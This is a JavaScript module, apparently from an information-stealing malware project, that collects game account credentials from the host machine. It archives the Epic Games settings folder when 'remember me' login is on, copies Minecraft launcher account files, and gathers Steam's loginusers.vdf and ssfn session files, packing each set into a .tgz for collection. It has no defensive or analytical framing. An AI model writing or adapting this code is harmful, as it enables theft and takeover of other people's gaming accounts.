const fs = require("fs-extra");
const path = require("node:path");
const ini = require("ini");
const paths = require("../config/path");
const Util = require("./Util");
const tmp = require("./tmp");

class Games {
  static async epicgames(outDir) {
    const userSettingsPath = path.join(paths.epicGames, "GameUserSettings.ini");

    if (!fs.pathExistsSync(userSettingsPath)) return false;

    const userSettingsFile = await fs
      .readFile(userSettingsPath, "utf-8")
      .catch(() => "");

    if (ini.parse(userSettingsFile)?.RememberMe?.Enable !== "True")
      return false;

    await Util.tarc(paths.epicGames, path.join(outDir, "epicgames.tgz"));

    return true;
  }

  static async minecraft(outDir) {
    const tempDir = path.resolve(tmp.dir, "minecraft");

    await fs.ensureDir(tempDir);

    for (const [launcher, patty] of Object.entries(paths.minecraft)) {
      if (!fs.pathExistsSync(patty)) continue;

      const name = launcher + path.extname(patty);
      fs.copySync(patty, path.join(tempDir, name));
    }

    await Util.tarc(tempDir, path.join(outDir, "minecraft.tgz"));

    return !!(await fs.readdir(tempDir).catch(() => [])).length;
  }

  static async steam(outDir) {
    const steamShortcuts = await Util.getLnkFromStartMenu("steam").catch((e) =>
      report(e, [])
    );
    let steamPaths = steamShortcuts.map((cut) =>
      path.dirname(Util.getLnkTarget(cut))
    );

    if (!Array.isArray(steamPaths) || !steamPaths.length)
      steamPaths = ["C:\\Program Files (x86)\\Steam"];

    if (steamPaths.length === 0 && !fs.pathExistsSync(steamPaths[0]))
      return false;

    const parentTempDir = path.join(tmp.dir, "steam");

    for (const steamPath of steamPaths) {
      const loginFile = path.join(steamPath, "config", "loginusers.vdf");

      if (!fs.pathExistsSync(loginFile)) continue;

      const tempDir = path.join(
        parentTempDir,
        `Profile ${steamPaths.indexOf(steamPath) + 1}`
      );

      await fs.copy(loginFile, path.join(tempDir, "loginusers.vdf"));

      const files = await fs.readdir(steamPath).catch(() => []);

      for (const file of files) {
        if (file.startsWith("ssfn"))
          await fs.copy(path.join(steamPath, file), path.join(tempDir, file));
      }
    }

    await Util.tarc(parentTempDir, path.join(outDir, "steam.tgz"));

    return !!(await fs.readdir(parentTempDir).catch(() => [])).length;
  }
}

module.exports = Games;
